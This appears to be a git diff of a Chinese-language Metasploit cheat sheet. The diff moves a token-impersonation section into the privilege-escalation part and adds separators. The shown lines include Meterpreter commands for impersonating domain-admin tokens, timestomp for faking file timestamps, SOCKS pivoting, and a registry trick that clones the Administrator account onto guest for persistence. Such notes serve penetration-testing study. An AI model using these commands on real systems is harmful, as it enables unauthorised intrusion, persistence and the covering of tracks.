@@ -1,7 +1,7 @@
 # Metasploit
 
 <p align="center">
-    <img src="../../../assets/img/logo/metasploit.png" width="20%"></a>
+    <img src="../../../assets/img/logo/metasploit.png" width="20%">
 </p>
 
 ---
@@ -171,6 +171,8 @@ getsystem   # 命令可以提权到本地系统权限
 sysinfo     # 显示系统名,操作系统,架构和语言等.
 ```
 
+---
+
 ### 获取会话
 
 **handler**
@@ -191,6 +193,8 @@ exploit -j  # 后台执行
 如果 meterpreter session 创建成功了,但很快就断连,此时应该修改使用的 payload,优先改成 generic/shell_reverse_tcp 等
 
 如果还不成功,切换回连端口或者改成 bind shell 试试
+
+---
 
 ### 信息收集
 
@@ -261,6 +265,8 @@ use auxiliary/sniffer/psnuffle
 set pcapfile 1.cap
 run
 ```
+
+---
 
 ### 权限提升
 
@@ -342,6 +348,23 @@ set session
 Exploit
 ```
 
+**令牌假冒**
+
+在用户登录 windows 操作系统时,系统都会给用户分配一个令牌(Token),当用户访问系统资源时都会使用这个令牌进行身份验证,功能类似于网站的 session 或者 cookie.
+
+msf 提供了一个功能模块可以让我们假冒别人的令牌,实现身份切换,如果目标环境是域环境,刚好域管理员登录过我们已经有权限的终端,那么就可以假冒成域管理员的角色.
+```bash
+getuid                              # 查看当前用户
+use incognito                       # 进入该模块
+list_tokens -u                      # 查看存在的令牌
+impersonate_token <Username>        # 令牌假冒
+# 注意用户名的斜杠需要写两个.
+
+getuid                              # 查看是否切换成功
+```
+
+---
+
 ### 文件操作
 
 **操作文件系统**
@@ -381,22 +404,9 @@ timestomp -v a.txt                  # 查看 a 的时间戳
 timestomp a.txt -f b.txt            # 使用 b 的时间覆盖 a 的时间
 ```
 
+---
+
 ### 横向
-
-**令牌假冒**
-
-在用户登录 windows 操作系统时,系统都会给用户分配一个令牌(Token),当用户访问系统资源时都会使用这个令牌进行身份验证,功能类似于网站的 session 或者 cookie.
-
-msf 提供了一个功能模块可以让我们假冒别人的令牌,实现身份切换,如果目标环境是域环境,刚好域管理员登录过我们已经有权限的终端,那么就可以假冒成域管理员的角色.
-```bash
-getuid                              # 查看当前用户
-use incognito                       # 进入该模块
-list_tokens -u                      # 查看存在的令牌
-impersonate_token <Username>        # 令牌假冒
-# 注意用户名的斜杠需要写两个.
-
-getuid                              # 查看是否切换成功
-```
 
 **域管理员嗅探**
 
@@ -405,6 +415,8 @@ use post/windows/gather/enum_domain
 set session 1
 exploit
 ```
+
+---
 
 ### 端口转发和内网代理
 
@@ -470,6 +482,8 @@ SRVHOST:监听的 ip 地址,默认为 0.0.0.0,一般不需要更改.
 SRVPORT:监听的端口,默认为 1080.
 直接运行 run 命令,就可以成功创建一个 socks4 代理隧道,在 linux 上可以配置 proxychains 使用,在 windows 可以配置 Proxifier 进行使用.
 ```
+
+---
 
 ### 权限维持
 
@@ -586,6 +600,8 @@ shell
 net user guest /active:yes
 reg copy HkLM\sam\sam\domains\account\users\000001f4 HkLM\sam\sam\domains\account\users\000001f5
 ```
+
+---
 
 ### 痕迹清除
 
